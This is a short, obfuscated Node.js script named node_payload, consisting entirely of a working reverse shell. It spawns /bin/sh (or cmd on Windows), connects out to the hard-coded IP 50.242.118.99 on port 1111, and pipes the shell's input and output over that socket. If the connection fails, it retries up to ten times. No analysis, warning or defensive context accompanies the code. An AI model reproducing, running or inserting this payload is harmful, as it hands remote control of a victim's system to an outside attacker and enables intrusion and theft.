function node_payload() {
    var _0x23bb54 = {
        'zTAWb': function (_0x115777, _0x11921c) {
            return _0x115777 === _0x11921c;
        },
        'LzZIo': 'undefined',
        'vlxvt': function (_0x11f67d, _0x120ad4, _0x4fd25b) {
            return _0x11f67d(_0x120ad4, _0x4fd25b);
        },
        'zyLPx': '50.242.118.99',
        'Xsqma': 'error',
        'BruOf': '/bin/sh',
        'vGMJT': 'net',
        'XKWdt': function (_0x336d7c, _0x10cb6f) {
            return _0x336d7c(_0x10cb6f);
        },
        'udOas': 'child_process',
        'qmMzn': 'util',
        'YolCt': function (_0x16022a) {
            return _0x16022a();
        }
    };
    var _0xb5577b = global['require'] || global['process']['mainModule']['constructor']['_load'];
    if (!_0xb5577b)
        return;
    var _0xd98e91 = global['process']['platform']['match'](/^win/i) ? 'cmd' : _0x23bb54['BruOf'];
    var _0x142c4d = _0xb5577b(_0x23bb54['vGMJT']);
    var _0x5f5197 = _0x23bb54['XKWdt'](_0xb5577b, _0x23bb54['udOas']);
    var _0x554ddf = _0xb5577b(_0x23bb54['qmMzn']);
    var _0x285503 = _0x5f5197['spawn'](_0xd98e91, []);
    var _0x325ff1 = this;
    var _0x4f8d12 = 0x0;
    function _0x418b7d() {
        var _0xc33d8b = {
            'kQepD': function (_0x197624, _0x209465, _0x36e2d9) {
                return _0x23bb54['vlxvt'](_0x197624, _0x209465, _0x36e2d9);
            }
        };
        _0x325ff1['socket'] = _0x142c4d['connect'](0x457, _0x23bb54['zyLPx'], function () {
            _0x325ff1['socket']['pipe'](_0x285503['stdin']);
            if (_0x23bb54['zTAWb'](typeof _0x554ddf['pump'], _0x23bb54['LzZIo'])) {
                _0x285503['stdout']['pipe'](_0x325ff1['socket']);
                _0x285503['stderr']['pipe'](_0x325ff1['socket']);
            } else {
                _0x554ddf['pump'](_0x285503['stdout'], _0x325ff1['socket']);
                _0x554ddf['pump'](_0x285503['stderr'], _0x325ff1['socket']);
            }
        });
        _0x325ff1['socket']['on'](_0x23bb54['Xsqma'], function (_0x1a8e70) {
            _0x4f8d12++;
            if (_0x4f8d12 <= 0xa) {
                _0xc33d8b['kQepD'](setTimeout, function () {
                    _0x418b7d();
                }, 0x5 * 0x3e8);
            } else {
                process['exit']();
            }
        });
    }
    _0x23bb54['YolCt'](_0x418b7d);
}
console['log']('poop');
node_payload();
